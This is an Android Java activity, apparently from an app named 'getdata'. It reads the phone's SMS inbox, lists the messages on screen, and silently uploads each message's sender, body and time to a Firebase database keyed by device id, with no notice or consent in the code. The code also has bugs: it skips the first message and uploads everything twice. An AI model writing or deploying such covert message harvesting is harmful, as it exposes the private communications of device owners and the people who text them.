package com.swadesiapps.getdata;

import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.format.DateFormat;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class SMSActivity extends AppCompatActivity {

    private DatabaseReference mDataRef;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sms);
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        ListView lViewSMS =  findViewById(R.id.listViewSMS);
        mDataRef = FirebaseDatabase.getInstance().getReference().child(Constants.deviceid).child("message");
        if(fetchInbox()!=null)
        {
            ArrayAdapter adapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, fetchInbox());
            lViewSMS.setAdapter(adapter);
        }else{
            Toast.makeText(this, "No messaging service found", Toast.LENGTH_SHORT).show();
        }
    }

    public ArrayList fetchInbox()
    {
        ArrayList sms = new ArrayList();

        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);

        cursor.moveToFirst();
        while  (cursor.moveToNext())
        {
            String address = cursor.getString(1);
            String body = cursor.getString(3);
            String date = cursor.getString(2);
            String id = cursor.getString(0);
            Calendar cal = Calendar.getInstance(Locale.ENGLISH);
            cal.setTimeInMillis(Long.parseLong(date));
            String dateFormatted = DateFormat.format("dd-MM-yyyy hh:mm:ss", cal).toString();
            sms.add("Recipient ==> "+address+"\nSMS ==> "+body+"\n"+dateFormatted);
            Map<String,Object> messageMap = new HashMap<>();
            messageMap.put("recipient",address);
            messageMap.put("time",dateFormatted);
            messageMap.put("message",body);
            mDataRef.child(id).updateChildren(messageMap);
        }
        return sms;

    }
}